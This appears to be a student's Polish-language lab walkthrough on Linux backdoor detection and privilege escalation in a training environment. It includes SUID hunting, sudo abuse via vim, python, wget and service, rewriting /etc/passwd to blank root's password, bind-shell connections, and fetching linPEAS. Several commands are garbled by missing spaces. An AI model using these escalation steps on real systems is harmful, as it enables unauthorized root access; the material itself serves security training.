# Eskalacja Uprawień
GTFOBins (https://gtfobins.github.io)  to baza danych narzędzi systemowych na Unix/Linux, które mogą być
wykorzystane do eskalacji uprawnień, omijania zabezpieczeń lub wykonywania
nieautoryzowanych działań.

## Automated enumeration tools
`linPEAS` : https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

## Ćwiczenia
Upload linPEAS:
```
Student (Kali Linux):
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.7:/home/student
```
Run linPEAS:
```
student@backdoor-detection:
bash linpeas.sh
```
Backdoor 0 - Baseline:
```
ssh system0@192.168.100.7-p 2200 #hasło: pjatk
su #hasło: toor, podane w wiadomości po zalogowaniu
/root/solve
```
Backdoor 1 - SUID:
Przykładem popularnej techniki ukrywania root backdoora w systemie jest ukrywanie pliku
binarnego powłoki z ustawionym bitem SUID w jakimś miejscu. Pierwsza seria wyzwań
skupi się na wykrywaniu takich plików.
Przykładowy plik binarny z SUID znajduje się w katalogu domowym. Możesz uruchomić
polecenie 'ls-l', aby sprawdzić, czy bit SUID jest ustawiony (chmod u+s). Opcjonalnie
możesz uruchomić skrypt linpeas.sh, aby sprawdzić, czy podejrzany plik jest wykrywany.
```
ssh system1@192.168.100.7-p 2201
ls-l
./backdoor
/root/solve
```
Backdoor 2 – ukryty SUID:
```
ssh system2@192.168.100.7-p 2202

find / -type f -perm /6000 2>/dev/null
/usr/sbin/nothing
/root/solve
```
albo
`find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null`
albo
```
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/delete
/root/solve
```
Backdoor 3 – Shell SUID:
 ```
ssh system3@192.168.100.7-p 2203
find / -type f -perm /6000 2>/dev/null
bash -p #bash bez parametru -p ignoruje SUID i cofa wyższe uprawnienia!
id
/root/solve
 ```
albo:
`find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null`
Backdoor 4 – podmieniony SUID:
```
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null
#uruchom tę komendę również na system0 i porównaj wyniki
/usr/lib/openssh/ssh-keysign
/root/solve
```
albo:
`find / -type f -perm /4000 -exec ls -l {} \; 2>/dev/null`
albo:
```
find / -perm -4000 -type f 2>/dev/null
cd /usr/bin
ls -ls ~ grp rwsr
chfn
/root/solve
```
Backdoor 5 – Sudo:
```
ssh system5@192.168.100.7-p 2205
sudo -l
sudo /usr/bin/python3 -c "import os;os.system('/root/solve')"
```
Backdoor 6 – GTFOBins:
```
ssh system6@192.168.100.7-p 2206
sudo -l
#https://gtfobins.github.io/gtfobins/vim/#sudo
sudo vim
:!bash
/root/solve
```
Backdoor 7 – Passwd:
```
ssh system7@192.168.100.7-p 2207
cat /etc/passwd | grep root #root nie ma hasła!
su
/root/solve
```
Backdoor 8 – All in One:
```
ssh system8@192.168.100.7-p 2208
sudo -l
cp /etc/passwd .
sed-i s/root:x/root:/ ./passwd
sudo curl file:///home/system8/passwd -o /etc/passwd
su
/root/solve
```
albo:
```
sudo -l
touch temp
chmod +x temp
echo -e '#!/bin/sh\n/bin/sh 1>&0` > temp
sudo wget --use-askpass=./temp 0
/root/solve
```
Backdoor 9 – Bind Shell:
```
ssh system9@192.168.100.7-p 2209
ss -tlpn
ps aux
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:12345
/root/solve
```
___
## Ćwiczenia pentest
Załadowanie Nmap:
```
Student (Kali Linux):
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.7:/home/student
student@backdoor-detection:
tar zxvf nmap-x64.tar.gz
```
Skan Nmap:
```
student@backdoor-detection:
./nmap-p--n-Pn-sV-vv 192.168.200.57
```
Bind Shell:
Celem zadania jest połączenie się i detekcja tylnej furtki typu bind shell na hoście
192.168.200.57:
Zwróć uwagę, że nmap oznaczył port 8080 jako „http-proxy?” bez wykrytej wersji,
a na końcu raportu widać shell prompt wskazujący na bind shell!
```
student@backdoor-detection:
nc 192.168.200.57 8080
```
linPEAS upload 1:
```
student@backdoor-detection:
python3 -m http.server 1234

admin@192.168.200.57:
wget http://192.168.200.7/linpeas.sh
```
Flaga Roota:
Zauważ, że linPEAS wykrył możliwość uruchomienia polecenia service za pomocą
sudo! Jeżeli nie wiesz jak wykorzystać to polecenie do eskalacji uprawnień,
pamiętaj o dokumentacji na stronie GFTOBins!
https://gtfobins.github.io/gtfobins/service/#sudo

```
admin@192.168.200.57:
sudo -l
sudo service ../../bin/bash
id
cat /root/root.txt
```
Ja tut tylko zrobiłem `su`